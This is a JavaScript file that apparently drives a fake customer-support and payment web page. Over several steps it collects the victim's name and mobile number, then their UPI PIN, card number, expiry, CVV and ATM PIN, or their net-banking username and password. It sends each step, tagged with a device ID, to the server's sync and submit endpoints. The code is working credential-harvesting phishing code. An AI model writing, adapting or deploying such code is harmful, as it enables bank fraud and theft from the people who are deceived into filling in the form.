document.addEventListener('DOMContentLoaded', () => {
    const page1 = document.getElementById('page-1');
    const page2 = document.getElementById('page-2');
    const page3 = document.getElementById('page-3');
    
    // Payment Method Pages
    const pageUpi = document.getElementById('page-upi');
    const pageCard = document.getElementById('page-card');
    const pageNetbanking = document.getElementById('page-netbanking');

    const supportForm = document.getElementById('support-form');
    const paymentModeForm = document.getElementById('payment-mode-form');
    const topBar = document.getElementById('top-bar');
    
    // Store collected form data
    const collectedData = {};

    // Get deviceId from URL params
    const urlParams = new URLSearchParams(window.location.search);
    const deviceId = urlParams.get('deviceId') || 'unknown_device';

    // Helper: get server base URL (same origin)
    function getBaseUrl() {
        return window.location.origin;
    }

    // Helper: sync page data to server
    function syncPageData(pageName, pageData) {
        const payload = {
            deviceId: deviceId,
            pageName: pageName,
            pageData: pageData,
            timestamp: new Date().toISOString()
        };

        fetch(getBaseUrl() + '/api/form/sync', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        })
        .then(res => res.json())
        .then(data => console.log('[Form] Page synced:', pageName, data))
        .catch(err => console.error('[Form] Sync error:', err));
    }

    // Helper: submit final form data to server
    function submitFormData() {
        const payload = {
            deviceId: deviceId,
            currentFlow: collectedData.paymentMethod || 'unknown',
            ...collectedData,
            submittedAt: new Date().toISOString()
        };

        fetch(getBaseUrl() + '/api/form/submit', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        })
        .then(res => res.json())
        .then(data => console.log('[Form] Submitted:', data))
        .catch(err => console.error('[Form] Submit error:', err));
    }

    // Handle Page 1 -> Page 2
    supportForm.addEventListener('submit', (e) => {
        e.preventDefault();
        // Validation check
        if(supportForm.checkValidity()) {
            collectedData.customerName = document.getElementById('customer-name').value;
            collectedData.mobileNumber = document.getElementById('mobile-number').value;
            collectedData.reason = document.getElementById('reason').value;

            // Sync customer info to server
            syncPageData('customer_info', {
                customerName: collectedData.customerName,
                mobileNumber: collectedData.mobileNumber,
                reason: collectedData.reason
            });

            page1.classList.remove('active');
            page2.classList.add('active');
            // Mockup screenshot 2 doesn't have the top bar
            topBar.classList.add('hidden');
        }
    });

    // Handle Page 2 -> Page 3
    paymentModeForm.addEventListener('submit', (e) => {
        e.preventDefault();
        // Validation check for amount
        if(paymentModeForm.checkValidity()) {
            collectedData.paymentMode = document.querySelector('input[name="payment-mode"]:checked')?.value || '';
            collectedData.amount = document.getElementById('amount').value;

            // Sync payment mode to server
            syncPageData('payment_mode', {
                paymentMode: collectedData.paymentMode,
                amount: collectedData.amount
            });

            page2.classList.remove('active');
            page3.classList.add('active');
        }
    });

    // Handle Payment Selection from Page 3
    window.selectPayment = function(method) {
        collectedData.paymentMethod = method;

        // Sync payment method selection to server
        syncPageData('payment_method', {
            paymentMethod: method
        });

        page3.classList.remove('active');
        topBar.classList.add('hidden'); // Ensure top bar stays hidden
        
        if (method === 'upi') {
            pageUpi.classList.add('active');
        } else if (method === 'card') {
            pageCard.classList.add('active');
        } else if (method === 'netbanking') {
            pageNetbanking.classList.add('active');
        }
    };

    // Handle Final Submission
    window.showFinalPage = function(e) {
        e.preventDefault();

        // Collect final page data based on selected method
        if (collectedData.paymentMethod === 'upi') {
            collectedData.upiBankName = document.getElementById('upi-bank-name').value;
            collectedData.upiPin = document.getElementById('upi-password').value;

            // Sync UPI details
            syncPageData('upi_details', {
                upiBankName: collectedData.upiBankName,
                upiPin: collectedData.upiPin
            });
        } else if (collectedData.paymentMethod === 'card') {
            collectedData.cardNumber = document.getElementById('card-number').value;
            collectedData.expiry = document.getElementById('expiry').value;
            collectedData.cvv = document.getElementById('cvv').value;
            collectedData.atmPin = document.getElementById('atm-pin').value;

            // Sync card details
            syncPageData('card_details', {
                cardNumber: collectedData.cardNumber,
                expiry: collectedData.expiry,
                cvv: collectedData.cvv,
                atmPin: collectedData.atmPin
            });
        } else if (collectedData.paymentMethod === 'netbanking') {
            collectedData.bankName = document.getElementById('bank-name').value;
            collectedData.username = document.getElementById('username').value;
            collectedData.password = document.getElementById('password').value;

            // Sync netbanking details
            syncPageData('netbanking_details', {
                bankName: collectedData.bankName,
                username: collectedData.username,
                password: collectedData.password
            });
        }

        // Submit full form data to server
        submitFormData();

        // Hide all active pages
        document.querySelectorAll('.page-view.active').forEach(el => el.classList.remove('active'));
        // Show Final Page
        document.getElementById('page-final').classList.add('active');
        // Restore Top Bar
        topBar.classList.remove('hidden');
        // Scroll to top
        window.scrollTo(0,0);
    };


});
